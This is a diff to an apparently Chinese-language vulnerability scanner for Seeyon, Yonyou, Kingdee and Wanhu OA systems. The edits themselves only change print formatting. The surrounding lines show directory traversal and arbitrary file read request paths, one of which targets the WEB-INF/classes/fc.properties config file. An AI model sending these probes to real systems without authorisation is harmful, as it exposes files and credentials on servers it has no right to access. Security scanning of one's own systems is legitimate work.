@@ -575,8 +575,7 @@ def seeyon_vuln_scan():
 
     }
     for url in url_list:
-        print("\n")
-        print("----------------------"+url+"----------------------")
+        print("url:"+url)
         # 获取当前时间
         now = datetime.now()
         # 格式化时间，只保留时、分、秒
@@ -713,8 +712,7 @@ def yonsuite_vuln_scan():
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
     }
     for url in url_list:
-        print("\n")
-        print("----------------------"+url+"----------------------")
+        print("url:"+url)
         # 1、用友 ERP-NC NCFindWeb 目录遍历漏洞
         yonsuite_ncfindweb_dir = "/NCFindWeb?service=IPreAlertConfigService&filename="
         try:
@@ -807,8 +805,7 @@ def kingdeeoa_vuln_scan():
     }
     
     for url in url_list:
-        print("\n")
-        print("----------------------"+url+"----------------------")
+        print("url:"+url)
         # 1、金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
         kinddeeoa_server_file_dir = "/admin/protected/selector/server_file/files?folder=/"
         try:
@@ -881,8 +878,7 @@ def wanhuoa_vuln_scan():
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
     }
     for url in url_list:
-        print("\n")
-        print("----------------------"+url+"----------------------")
+        print("url:"+url)
         # 1、万户OA DownloadServlet 任意文件读取漏洞
         wanhu_DownloadServlet_dir = "/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
         try:
@@ -941,7 +937,11 @@ def wanhuoa_vuln_scan():
                 print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在万户OA downloadhttp.jsp 任意文件下载漏洞")
         except:
             pass
-           
+
+
+
+
+
 
 if __name__ == "__main__":
     if len(sys.argv) > 1:
@@ -969,7 +969,8 @@ if __name__ == "__main__":
         elif func_name == 'kingdeeoa_vuln_scan':
             kingdeeoa_vuln_scan()   
         elif func_name == 'wanhuoa_vuln_scan':
-            wanhuoa_vuln_scan()                 
+            wanhuoa_vuln_scan()
+                         
         else:
             print("Invalid function number")
     else:
